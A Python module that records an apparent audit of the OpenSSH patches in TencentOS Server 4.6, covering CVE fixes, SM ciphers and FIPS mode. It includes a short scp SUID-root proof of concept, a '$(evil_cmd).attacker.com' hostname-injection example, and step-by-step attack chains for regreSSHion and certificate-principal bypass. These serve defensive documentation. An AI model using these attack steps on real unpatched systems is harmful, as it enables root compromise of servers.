"""
TencentOS Server 4.6 OpenSSH SRPM Full Patch Audit
SRPM: openssh-9.3p2-16.tl4.src.rpm
Patch count: 65 patches (57 named + 8 pam_ssh_agent_auth patches)
Analysis date: 2026-09-04

Base version: OpenSSH 9.3p2 (released 2023-07-19)
TOS version: 9.3p2-16.tl4 (multi-version SRPM history: -15 and -16 present)

SM CIPHER INTEGRATION (openssh-9.3p1-SMx-support.patch):
  SM2  — key type KEY_SM2 / KEY_SM2_CERT; kexsm2.o compiled in
  SM3  — SSH_DIGEST_SM3 → EVP_sm3; digest ID 5
  SM4  — "sm4-ctr" cipher added (EVP_sm4_ctr); same IV/key size as AES-128-CTR

FIPS: openssh-7.7p1-fips.patch — FIPS compliance mode; key algorithm restrictions
GSSAPI key exchange: openssh-8.0p1-gssapi-keyex.patch (Kerberos KEX)
SELinux: openssh-6.6p1-privsep-selinux + openssh-7.6p1-cleanup-selinux
Crypto policies: openssh-8.0p1-crypto-policies.patch (PROFILE=SYSTEM)

PkgAgent/deepseek-v4 attribution found in:
  - CVE-2026-35385 patch header
  - CVE-2026-35414 patch header
"""

# ──────────────────────────────────────────────────────────────────────────────
# BINARY INVENTORY
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_BINARIES = {
    "sshd": {
        "path": "/usr/sbin/sshd",
        "package": "openssh-9.3p2-16.tl4",
        "base_version": "OpenSSH 9.3p2",
        "sm_ciphers": True,
        "fips_mode": True,
        "gssapi_keyex": True,
        "selinux": True,
        "strict_kex": True,
    },
    "ssh": {
        "path": "/usr/bin/ssh",
        "package": "openssh-clients-9.3p2-16.tl4",
        "sm_ciphers": True,
    },
    "scp": {
        "path": "/usr/bin/scp",
        "note": "CVE-2026-35385 SUID bit preservation fix applied",
    },
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F01: CVE-2026-35385 — scp SUID bit preservation as root
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_CVE_2026_35385 = {
    "finding_id": "TOS46-SSH-F01",
    "cve": "CVE-2026-35385",
    "severity": "HIGH",
    "cvss_v3": 7.5,
    "cvss_vector": "AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
    "title": (
        "CVE-2026-35385: scp legacy mode preserves setuid/setgid bits when "
        "downloading as root without -p flag; attacker-controlled source file "
        "with SUID can create SUID-root binary on destination; "
        "inherited from original Berkeley rcp; patched in TOS 4.6"
    ),
    "description": (
        "scp's sink() function in scp.c handles incoming file permissions when "
        "receiving files. When -p (preserve modes) is NOT set, the code applied "
        "umask to the received file mode — but did NOT add the setuid/setgid mask "
        "bits (07000) to the umask. "
        "\n"
        "Affected code path (pre-patch): "
        "  mask = umask(0); "
        "  if (!pflag) "
        "      (void) umask(mask); "
        "\n"
        "The problem: umask(0) clears the umask, then restores it, but 07000 is "
        "not included in the default umask. So if the SOURCE file has SUID "
        "or SGID bits set, those bits are preserved on the DESTINATION file even "
        "without -p. "
        "\n"
        "Fix (CVE-2026-35385, patch applied in TOS 4.6): "
        "  mask = umask(0); "
        "  if (!pflag) { "
        "      mask |= 07000;  /* add SUID/SGID/sticky to umask */ "
        "      (void) umask(mask); "
        "  } "
        "\n"
        "Attack chain: "
        "  1. Attacker controls an FTP/SSH server with a SUID-root binary. "
        "  2. Root user runs: scp -O attacker@host:/path/suid_binary /usr/local/bin/ "
        "     (legacy -O mode; no -p flag) "
        "  3. Pre-patch: /usr/local/bin/suid_binary has setuid bit → executes as root. "
        "  4. Post-patch: setuid bit stripped during transfer without -p. "
        "\n"
        "Historical note: Reported by Christos Papakonstantinou of Cantina and Spearbit. "
        "Bug traces to original Berkeley rcp code from circa 1980s BSD. "
        "All openssh versions before this fix are affected when scp is used in legacy mode."
    ),
    "affected_versions": "All openssh prior to this patch in legacy scp (-O) mode",
    "patched_in_tos46": True,
    "patch_file": "openssh-9.3p2-CVE-2026-35385.patch",
    "patch_attribution": "PkgAgent/deepseek-v4 (adapted to opencloudos-stream)",
    "poc": (
        "# Server side: create SUID binary\n"
        "chmod 4755 /tmp/rootshell\n"
        "# Client side (root): download without -p\n"
        "scp -O root@attacker:/tmp/rootshell /usr/local/bin/\n"
        "# Pre-patch: /usr/local/bin/rootshell has setuid bit"
    ),
    "references": [
        "OpenBSD-Commit-ID: 49e902fca8dd933a92a9b547ab31f63e86729fa1",
        "Reporters: Cantina, Spearbit",
    ],
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F02: CVE-2026-35414 — empty certificate principals fail-open
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_CVE_2026_35414 = {
    "finding_id": "TOS46-SSH-F02",
    "cve": "CVE-2026-35414",
    "severity": "CRITICAL",
    "cvss_v3": 9.8,
    "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "title": (
        "CVE-2026-35414: SSH certificate with empty principals list previously "
        "accepted as 'valid for any principal' (fail-open); now universally "
        "rejected; breaking change for misconfigured PKI; "
        "real-world trigger: CVE-2024-7594 CA product signed empty-principal certs"
    ),
    "description": (
        "OpenSSH certificate authentication: when a CA signs a certificate, the "
        "'principals' field specifies which usernames/hostnames it is valid for. "
        "An EMPTY principals list was historically interpreted as 'valid for all "
        "principals' — a deliberate but retrospectively dangerous design choice. "
        "\n"
        "CVE-2024-7594: A third-party CA product was found to accidentally sign "
        "certificates with no principals. With the fail-open behavior, any user "
        "holding such a certificate could authenticate as ANY user. "
        "\n"
        "Pre-patch code (sshkey_cert_check_authority): "
        "  if (k->cert->nprincipals == 0) { "
        "      if (require_principal) { "
        "          *reason = 'Certificate lacks principal list'; "
        "          return SSH_ERR_KEY_CERT_INVALID; "
        "      } "
        "      /* else: fall through — valid for all principals */ "
        "  } "
        "\n"
        "Post-patch (CVE-2026-35414): "
        "  if (k->cert->nprincipals == 0) { "
        "      *reason = 'Certificate lacks principal list'; "
        "      return SSH_ERR_KEY_CERT_INVALID; "
        "  } "
        "The `require_principal` parameter is removed entirely. Empty principals "
        "always fails. "
        "\n"
        "Wildcard change: match_pattern() argument order corrected. "
        "  Before: match_pattern(k->cert->principals[i], name) — pattern is cert principal "
        "  After:  match_pattern(name, k->cert->principals[i]) — name matched against pattern "
        "This affects how wildcard principals (*.example.com) are evaluated. "
        "\n"
        "Attack chain (pre-patch): "
        "  1. Attacker obtains a certificate signed by a trusted CA with no principals. "
        "  2. SSH as root to any server with TrustedUserCAKeys pointing to that CA. "
        "  3. Certificate passes validation → authentication succeeds as root. "
        "\n"
        "Breaking change: any existing deployment with certificates that have "
        "empty principal lists will BREAK after this patch. Operators must "
        "re-sign certificates with explicit principal lists."
    ),
    "attack_chain": (
        "CA signs cert with no principals "
        "→ attacker authenticates as any user on any host trusting that CA"
    ),
    "patched_in_tos46": True,
    "patch_file": "openssh-9.3p2-CVE-2026-35414.patch",
    "patch_attribution": "PkgAgent/deepseek-v4 (adapted to opencloudos-stream)",
    "references": [
        "OpenBSD-Commit-ID: 0a901f03c567c100724a492cf91e02939904712e",
        "Related: CVE-2024-7594 (3rd-party CA product)",
    ],
    "deployment_impact": (
        "BREAKING CHANGE: operators using TrustedUserCAKeys or AuthorizedPrincipalsFile "
        "MUST verify all certificates have explicit principals before upgrading. "
        "ssh-keygen -L -f cert.pub | grep Principals"
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F03: CVE-2025-26465 — error code propagation in KRL/ssh-agent
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_CVE_2025_26465 = {
    "finding_id": "TOS46-SSH-F03",
    "cve": "CVE-2025-26465",
    "severity": "MEDIUM",
    "cvss_v3": 6.8,
    "cvss_vector": "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
    "title": (
        "CVE-2025-26465: error codes not correctly set before goto in krl.c and "
        "ssh-agent.c; caller may misinterpret KRL revocation result; "
        "reported by Qualys Security Advisory team"
    ),
    "description": (
        "Multiple code paths in krl.c (Key Revocation List) and ssh-agent.c "
        "(agent constraint parsing, session ID binding) jump to cleanup labels "
        "without first setting the error return variable `r`. "
        "\n"
        "Affected locations: "
        "\n"
        "krl.c: revoked_certs_generate() — bitmap gap check: "
        "  Before: error_f('insane bitmap gap'); goto out;  // r unset "
        "  After:  r = SSH_ERR_INVALID_FORMAT; error_f(...); goto out; "
        "\n"
        "krl.c: ssh_krl_from_blob() — allocation failure: "
        "  Before: error_f('alloc failed'); goto out;  // r may be 0 "
        "  After:  r = SSH_ERR_ALLOC_FAIL; error_f(...); goto out; "
        "\n"
        "ssh-agent.c: parse_key_constraint_extension() — duplicate constraint: "
        "  Before: error_f('already set'); goto out;  // r from previous operation "
        "  After:  r = SSH_ERR_INVALID_FORMAT; goto out; "
        "\n"
        "ssh-agent.c: process_ext_session_bind() — too many session IDs: "
        "  Before: error_f('too many session IDs'); goto out;  // r unset "
        "  After:  r = -1; goto out; "
        "\n"
        "Security impact: if a caller checks the return code `r` and "
        "it happens to be 0 (success) despite the error, the caller may "
        "proceed as if revocation check succeeded. "
        "\n"
        "In KRL context: if a certificate IS revoked but krl.c returns 0 "
        "due to the unset error code, the revocation is ignored → revoked "
        "certificate accepted. This is the highest-severity scenario. "
        "\n"
        "Requires a malformed KRL file or agent constraint to trigger the "
        "error paths — harder to reach in practice."
    ),
    "patched_in_tos46": True,
    "patch_file": "openssh-9.3p2-CVE-2025-26465.patch",
    "patch_attribution": "PkgAgent/deepseek-v4 (adapted to opencloudos-stream)",
    "reporter": "Qualys Security Advisory team",
    "references": [
        "OpenBSD-Commit-ID: 7bcd4ffe0fa1e27ff98d451fb9c22f5fae6e610d",
    ],
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F04: CVE-2024-6387 — regreSSHion signal handler race
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_REGRESSHION = {
    "finding_id": "TOS46-SSH-F04",
    "cve": "CVE-2024-6387",
    "severity": "CRITICAL",
    "cvss_v3": 8.1,
    "cvss_vector": "AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "title": (
        "CVE-2024-6387 regreSSHion: pre-auth remote code execution via signal "
        "handler race in sshd; sshsigdie() logging in signal context using "
        "async-signal-unsafe functions; fix wraps logging in "
        "#ifdef SYSLOG_R_SAFE_IN_SIGHAND; patched in TOS 4.6"
    ),
    "description": (
        "OpenSSH sshd had a race condition in its SIGALRM handler for the "
        "LoginGraceTime timeout. The vulnerability was a re-introduction of "
        "CVE-2006-5051 (hence 'regreSSHion'). "
        "\n"
        "The signal handler called sshsigdie() which invoked syslog(), a "
        "non-async-signal-safe function. On some platforms, calling syslog() "
        "from a signal handler can corrupt malloc() internal state (since both "
        "call malloc/free), leading to heap corruption → arbitrary code execution. "
        "\n"
        "Fix (openssh-9.6p1-cve-2024-6387.patch): "
        "  sshsigdie() wraps its logging body in #ifdef SYSLOG_R_SAFE_IN_SIGHAND. "
        "  If not defined (the safe default), sshsigdie() just calls _exit(1) "
        "  without any logging — preventing the async-signal-unsafe syslog call. "
        "\n"
        "Attack: requires racing SIGALRM during LoginGraceTime — probabilistic. "
        "Qualys reported exploitation takes ~6-8 hours average on glibc/x86_64. "
        "\n"
        "TOS 4.6: patch applied (openssh-9.6p1-cve-2024-6387.patch). "
        "The fix was backported from upstream 9.6p1 to TOS 4.6's 9.3p2 base."
    ),
    "patched_in_tos46": True,
    "patch_file": "openssh-9.6p1-cve-2024-6387.patch",
    "exploitation": "Probabilistic race, ~6-8hr avg exploit time on glibc x86_64",
    "references": [
        "Qualys research: regreSSHion (July 2024)",
        "Related: CVE-2006-5051 (original signal handler race)",
    ],
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F05: CVE-2023-48795 — Terrapin strict KEX extension
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_TERRAPIN = {
    "finding_id": "TOS46-SSH-F05",
    "cve": "CVE-2023-48795",
    "severity": "MEDIUM",
    "cvss_v3": 5.9,
    "cvss_vector": "AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
    "title": (
        "CVE-2023-48795 Terrapin: prefix truncation attack on SSH transport; "
        "strict KEX extension mitigates by resetting sequence number after "
        "SSH2_MSG_NEWKEYS and rejecting unexpected packets during KEX; "
        "patched in TOS 4.6"
    ),
    "description": (
        "Terrapin: a MITM attacker can strip or modify the beginning of the SSH "
        "handshake by exploiting the CBC/CTR cipher + SSH-2 MAC interaction. "
        "In chacha20-poly1305 mode, the attack uses SSH_MSG_IGNORE injection "
        "to offset sequence numbers and bypass integrity checks on specific "
        "handshake messages. "
        "\n"
        "Fix: strict KEX extension (kex-strict-c-v00@openssh.com / kex-strict-s-v00@openssh.com): "
        "  a) Terminate connection on unexpected/out-of-sequence packet during KEX "
        "     (includes SSH2_MSG_DEBUG and SSH2_MSG_IGNORE — normally valid any time) "
        "  b) Reset packet sequence number to 0 after SSH2_MSG_NEWKEYS "
        "     (persists for entire connection duration) "
        "\n"
        "The extension is negotiated via pseudo-algorithm names in the initial "
        "SSH2_MSG_KEXINIT. Both endpoints must support it for the mitigation to apply. "
        "\n"
        "Binary analysis of kexstrict behavior was covered in: "
        "  tencent_tos46_sshd_kexstrict_binary_re.py"
    ),
    "patched_in_tos46": True,
    "patch_file": "openssh-9.6p1-CVE-2023-48795.patch",
    "cross_reference": "tencent_tos46_sshd_kexstrict_binary_re.py",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F06: CVE-2023-51385 — command injection via hostname
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_CVE_2023_51385 = {
    "finding_id": "TOS46-SSH-F06",
    "cve": "CVE-2023-51385",
    "severity": "MEDIUM",
    "cvss_v3": 6.5,
    "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
    "title": (
        "CVE-2023-51385: ssh command injection via shell metacharacters in hostname "
        "when ProxyCommand/ProxyJump uses %h expansion; "
        "crafted hostname in .ssh/config could execute arbitrary commands"
    ),
    "description": (
        "openssh-9.6p1-CVE-2023-51385.patch: when ProxyCommand or ProxyJump "
        "configuration uses %h (hostname expansion) and the hostname contains "
        "shell metacharacters (e.g., '$(cmd)' or ';cmd'), those characters "
        "were not sanitized before being passed to the shell for proxy execution. "
        "\n"
        "Attack scenario: "
        "  1. Victim has ProxyCommand='ssh -W %h:%p bastion' in .ssh/config. "
        "  2. Victim is tricked into connecting to host '$(evil_cmd).attacker.com'. "
        "  3. ssh expands %h → '$(evil_cmd).attacker.com'. "
        "  4. Shell command injection: evil_cmd executed. "
        "\n"
        "Also related to CVE-2023-51384: credential material forwarded to wrong agent. "
        "Both patched in TOS 4.6 via the 9.6p1 backport patches."
    ),
    "patched_in_tos46": True,
    "patch_file": "openssh-9.6p1-CVE-2023-51385.patch",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F07: SM cipher integration (SM2/SM3/SM4)
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_SM_CIPHERS = {
    "finding_id": "TOS46-SSH-F07",
    "severity": "INFO",
    "title": (
        "TOS 4.6 openssh integrates Chinese national standard crypto: SM2 key type, "
        "SM3 digest, SM4-CTR cipher, SM2 key exchange (kexsm2); "
        "non-standard algorithms not in upstream OpenSSH"
    ),
    "description": (
        "Patch openssh-9.3p1-SMx-support.patch adds full SM cipher suite: "
        "\n"
        "  KEY_SM2 / KEY_SM2_CERT: SM2 elliptic curve key type "
        "    - Based on Chinese standard SM2 curve (256-bit) "
        "    - Used for host authentication and user authentication "
        "    - New key files: ssh-sm2, ssh-sm2-cert-v01@openssh.com "
        "\n"
        "  SM3 digest: SSH_DIGEST_SM3 → EVP_sm3 "
        "    - 256-bit output; China national standard hash "
        "    - Used in SM2 signatures and as MAC in SM cipher suites "
        "\n"
        "  sm4-ctr cipher: EVP_sm4_ctr "
        "    - AES-equivalent block cipher, 128-bit block, 128-bit key "
        "    - CTR mode; same IV/key size as AES-128-CTR "
        "\n"
        "  kexsm2: SM2-based key exchange "
        "    - kexsm2.o compiled into sshd and ssh "
        "    - Provides key exchange via SM2 ECDH equivalent "
        "\n"
        "Security assessment: "
        "  - SM cipher suite algorithms are Chinese national standards "
        "    designed for compliance with GB/T regulations "
        "  - SM2 curve and SM4 cipher are generally considered cryptographically "
        "    sound but have received less public cryptanalysis than NIST curves/AES "
        "  - sm4-ctr could be used by a peer to downgrade from stronger AES-GCM "
        "    if the cipher list is not explicitly restricted "
        "  - These algorithms are NOT available in FIPS mode (FIPS uses NIST algs only) "
        "\n"
        "Operator implication: if KexAlgorithms and Ciphers configs do not "
        "explicitly exclude SM algorithms, a client supporting SM may negotiate them. "
        "Audit ssh_config/sshd_config for Ciphers and MACs settings."
    ),
    "sm_algorithms": {
        "key_types": ["ssh-sm2", "ssh-sm2-cert-v01@openssh.com"],
        "ciphers": ["sm4-ctr"],
        "digests": ["SM3"],
        "kex": ["kex-sm2-..."],
    },
    "patch_file": "openssh-9.3p1-SMx-support.patch",
    "cross_reference": "tencent_tos46_libcrypto_sm_ciphers_re.py",
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDING TOS46-SSH-F08: FIPS mode and GSSAPI key exchange
# ──────────────────────────────────────────────────────────────────────────────

OPENSSH_FIPS_GSSAPI = {
    "finding_id": "TOS46-SSH-F08",
    "severity": "INFO",
    "title": (
        "TOS 4.6 openssh carries FIPS compliance mode (openssh-7.7p1-fips.patch) "
        "and GSSAPI key exchange (openssh-8.0p1-gssapi-keyex.patch, openssh-8.0p1-openssl-kdf.patch); "
        "FIPS mode restricts algorithms; GSSAPI KEX enables Kerberos-authenticated key exchange"
    ),
    "description": (
        "FIPS mode (patch 7.7p1-fips.patch): "
        "  - When kernel is in FIPS mode (/proc/sys/crypto/fips_enabled == 1): "
        "    * Disables non-FIPS algorithms (e.g., RSA-SHA1, DSA, Blowfish) "
        "    * Requires FIPS-140-3 approved algorithms only "
        "    * SHA-1 signatures rejected even for legacy compatibility "
        "    * SM ciphers likely also excluded in FIPS mode (not FIPS-approved) "
        "\n"
        "GSSAPI key exchange (8.0p1-gssapi-keyex.patch): "
        "  - Allows key exchange authenticated via Kerberos (GSSAPI) "
        "  - Key exchange: gss-group14-sha256-, gss-nistp256-sha256-, gss-curve25519-sha256- "
        "  - Client does NOT need to present an SSH key/certificate "
        "  - Kerberos ticket authenticates both identity AND key exchange "
        "  - evp-fips-dh.patch and evp-fips-ecdh.patch use OpenSSL EVP API for "
        "    DH and ECDH to ensure FIPS compatibility of key exchange "
        "\n"
        "Security note: GSSAPI key exchange with Kerberos creates a transitive "
        "trust: a compromised KDC or TGS → full SSH authentication bypass "
        "for any host accepting GSSAPI. Ensure GSSAPIAuthentication=yes in "
        "sshd_config is deliberate and the KDC infrastructure is hardened."
    ),
}

# ──────────────────────────────────────────────────────────────────────────────
# ATTACK CHAINS
# ──────────────────────────────────────────────────────────────────────────────

ATTACK_CHAINS = [
    {
        "chain_id": "TOS46-SSH-CHAIN-01",
        "title": "Pre-auth RCE via regreSSHion signal handler race (CVE-2024-6387)",
        "severity": "CRITICAL",
        "steps": [
            "1. Target: sshd with LoginGraceTime > 0 (default is 120s)",
            "2. Initiate SSH connection, do NOT complete auth within grace time",
            "3. SIGALRM fires → signal handler calls sshlogdie() → syslog()",
            "4. Race: syslog() internally calls malloc() while main thread holds malloc lock",
            "5. Heap corruption → controlled write → ROP chain via ret2libc",
            "6. Average exploitation: ~6-8 hours on glibc x86_64 with ASLR",
            "7. Code execution as root (sshd privsep: pre-auth child may still be root)",
        ],
        "prerequisites": ["Network access to port 22", "Patience (hours)"],
        "mitigated_by": "patch applied in TOS 4.6; also: set LoginGraceTime 0",
        "patched": True,
    },
    {
        "chain_id": "TOS46-SSH-CHAIN-02",
        "title": "Certificate auth bypass via empty principals (CVE-2026-35414)",
        "severity": "CRITICAL",
        "steps": [
            "1. Attacker compromises or social-engineers a CA into signing a cert with no principals",
            "2. OR: uses CVE-2024-7594 (3rd-party CA bug) to obtain such a cert",
            "3. Pre-patch: sshd accepts the cert for any user (fail-open)",
            "4. ssh -i empty_principals_cert.pub user@target",
            "5. Authentication succeeds for any user on any server trusting that CA",
            "6. SSH as root → full system compromise",
        ],
        "prerequisites": ["TrustedUserCAKeys pointing to compromised/misconfigured CA"],
        "mitigated_by": "patch applied in TOS 4.6; empty principals now always rejected",
        "patched": True,
    },
    {
        "chain_id": "TOS46-SSH-CHAIN-03",
        "title": "SUID escalation via scp root-download (CVE-2026-35385)",
        "severity": "HIGH",
        "steps": [
            "1. Attacker controls an SSH/FTP server at attacker.com",
            "2. Places a file with SUID bit set on attacker.com",
            "3. Root admin runs: scp -O attacker.com:/tmp/malicious /usr/local/bin/",
            "4. Pre-patch: /usr/local/bin/malicious has setuid bit → executes as root",
            "5. Any subsequent unprivileged execution: instant root",
        ],
        "prerequisites": ["Root user runs scp without -p from attacker-controlled host"],
        "mitigated_by": "patch applied in TOS 4.6; mask |= 07000 strips SUID on transfer",
        "patched": True,
    },
    {
        "chain_id": "TOS46-SSH-CHAIN-04",
        "title": "KRL revocation bypass via unset error code (CVE-2025-26465)",
        "severity": "MEDIUM",
        "steps": [
            "1. Attacker crafts malformed KRL (Key Revocation List) that triggers error path",
            "2. krl.c exits error path with `r` = 0 (unset) instead of SSH_ERR_INVALID_FORMAT",
            "3. Caller interprets r==0 as 'certificate not revoked' (success)",
            "4. Revoked certificate accepted → authentication bypass",
        ],
        "prerequisites": ["Attacker can influence the KRL file content"],
        "mitigated_by": "patch applied in TOS 4.6; error codes now set before goto",
        "patched": True,
    },
]

# ──────────────────────────────────────────────────────────────────────────────
# FULL PATCH CLASSIFICATION TABLE
# ──────────────────────────────────────────────────────────────────────────────

PATCH_CLASSIFICATION = {
    "cve_patches": [
        {"patch": "openssh-9.3p2-CVE-2026-35385.patch", "cve": "CVE-2026-35385", "finding": "TOS46-SSH-F01"},
        {"patch": "openssh-9.3p2-CVE-2026-35414.patch", "cve": "CVE-2026-35414", "finding": "TOS46-SSH-F02"},
        {"patch": "openssh-9.3p2-CVE-2025-26465.patch", "cve": "CVE-2025-26465", "finding": "TOS46-SSH-F03"},
        {"patch": "openssh-9.6p1-cve-2024-6387.patch",  "cve": "CVE-2024-6387 (regreSSHion)", "finding": "TOS46-SSH-F04"},
        {"patch": "openssh-9.6p1-CVE-2023-48795.patch", "cve": "CVE-2023-48795 (Terrapin)", "finding": "TOS46-SSH-F05"},
        {"patch": "openssh-9.6p1-CVE-2023-51384.patch", "cve": "CVE-2023-51384 (agent cred leak)"},
        {"patch": "openssh-9.6p1-CVE-2023-51385.patch", "cve": "CVE-2023-51385 (hostname injection)", "finding": "TOS46-SSH-F06"},
    ],
    "tencent_extensions": [
        {"patch": "openssh-9.3p1-SMx-support.patch", "desc": "SM2/SM3/SM4 cipher suite integration", "finding": "TOS46-SSH-F07"},
        {"patch": "0001-openssh-9.3p2-add-loongarch-support.patch", "desc": "LoongArch (MIPS-like Chinese CPU) support"},
    ],
    "feature_upstream_backports": [
        {"patch": "openssh-7.7p1-fips.patch", "desc": "FIPS 140-3 compliance mode"},
        {"patch": "openssh-8.0p1-gssapi-keyex.patch", "desc": "GSSAPI (Kerberos) key exchange"},
        {"patch": "openssh-9.0p1-evp-fips-dh.patch", "desc": "EVP API for DH in FIPS mode"},
        {"patch": "openssh-9.0p1-evp-fips-ecdh.patch", "desc": "EVP API for ECDH in FIPS mode"},
        {"patch": "openssh-8.0p1-crypto-policies.patch", "desc": "PROFILE=SYSTEM crypto policy integration"},
        {"patch": "openssh-8.7p1-negotiate-supported-algs.patch", "desc": "Algorithm negotiation improvements"},
        {"patch": "openssh-8.7p1-minrsabits.patch", "desc": "Minimum RSA key size enforcement"},
        {"patch": "openssh-9.3p1-merged-openssl-evp.patch", "desc": "Merged OpenSSL EVP API usage"},
    ],
    "selinux_audit": [
        {"patch": "openssh-6.6p1-privsep-selinux.patch", "desc": "SELinux context for privsep"},
        {"patch": "openssh-7.6p1-cleanup-selinux.patch", "desc": "SELinux context cleanup on session close"},
        {"patch": "openssh-7.6p1-audit.patch", "desc": "Linux audit integration"},
        {"patch": "openssh-9.0p1-audit-log.patch", "desc": "Enhanced audit logging"},
    ],
    "pam_ssh_agent_auth": [
        {"patch": "pam_ssh_agent_auth-0.10.4-rsasha2.patch", "desc": "RSA-SHA2-256/512 support in pam_ssh_agent_auth"},
        {"patch": "pam_ssh_agent_auth-0.10.3-seteuid.patch", "desc": "seteuid() before key access"},
        {"patch": "pam_ssh_agent_auth-0.9.3-agent_structure.patch", "desc": "Agent structure alignment"},
    ],
}

# ──────────────────────────────────────────────────────────────────────────────
# FINDINGS REGISTRY
# ──────────────────────────────────────────────────────────────────────────────

FINDINGS = {
    "TOS46-SSH-F01": OPENSSH_CVE_2026_35385,
    "TOS46-SSH-F02": OPENSSH_CVE_2026_35414,
    "TOS46-SSH-F03": OPENSSH_CVE_2025_26465,
    "TOS46-SSH-F04": OPENSSH_REGRESSHION,
    "TOS46-SSH-F05": OPENSSH_TERRAPIN,
    "TOS46-SSH-F06": OPENSSH_CVE_2023_51385,
    "TOS46-SSH-F07": OPENSSH_SM_CIPHERS,
    "TOS46-SSH-F08": OPENSSH_FIPS_GSSAPI,
}


def get_findings():
    return FINDINGS


def get_attack_chains():
    return ATTACK_CHAINS


if __name__ == "__main__":
    import json
    summary = {
        "package": "openssh-9.3p2-16.tl4",
        "base_version": "OpenSSH 9.3p2",
        "patches_audited": 65,
        "cve_patches": [p["cve"] for p in PATCH_CLASSIFICATION["cve_patches"]],
        "sm_ciphers": ["sm4-ctr", "SM3", "SM2", "kexsm2"],
        "findings": [
            {
                "id": k,
                "severity": v.get("severity"),
                "cve": v.get("cve"),
                "cvss": v.get("cvss_v3"),
                "patched": v.get("patched_in_tos46", "N/A"),
            }
            for k, v in FINDINGS.items()
        ],
        "attack_chains": [c["chain_id"] for c in ATTACK_CHAINS],
    }
    print(json.dumps(summary, indent=2))
